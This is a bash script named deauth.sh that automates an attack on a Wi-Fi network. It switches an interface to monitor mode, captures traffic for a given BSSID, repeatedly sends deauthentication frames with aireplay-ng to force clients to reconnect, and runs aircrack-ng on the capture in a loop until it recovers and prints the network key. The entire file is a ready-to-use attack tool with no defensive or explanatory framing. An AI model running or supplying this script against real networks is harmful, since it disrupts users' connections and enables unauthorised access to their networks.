# Check for arguments
if [ $# -lt 3 ]
  then
        echo "Not enough arguments supplied"
        echo "Usage: ./deauth.sh  <bssid> <channel> <interface>"  
else
        #TODO start interfase in monitor mode
        BSSID=$1
        CHAN=$2
        INTERF=$3
        TIMEOUT=20
	sudo airmon-ng start $INTERF 
	MON=$(iwconfig 2> /dev/null | grep -i mon|awk '{print $1}')
        DATE=`date '+%Y_%m_%d_%H_%M_%S'`
	KEY="KEY-$BSSID-$DATE.txt" 
        LOG_FILE=log-$BSSID-$DATE.txt
        sudo airodump-ng -w $BSSID --write-interval 1 -c $CHAN --bssid $BSSID $MON &> /dev/null &
        TEMP="$BSSID*.csv"
        sleep 1
        OUTPUT_AIRO=$(ls $TEMP|grep -v kismet | tail -n 1)
	CAP_FILE=$(ls $BBSID*.cap|tail -n 1)
	#echo $CAP_FILE
        #echo $OUTPUT_AIRO
	#watch cat
        while [ ! -f $KEY ]; do
		echo "airplay..."
                sudo aireplay-ng -0 3 -a $BSSID $MON &>> $LOG_FILE & 
                echo "sleeping for $TIMEOUT seconds" >>  $LOG_FILE
                sleep $TIMEOUT
		echo "aircrack..."
		sudo aircrack-ng -l $KEY $CAP_FILE  > crack.txt &
		pids[0]=$!
		echo "sleeping for 5 seconds"
		sleep 5
		echo "aircrack pid " $pids[0]
		echo "killing ${pids[0]}"
		sudo kill -9 ${pids[0]}

        done 
	echo "found key " $(cat $KEY)
fi
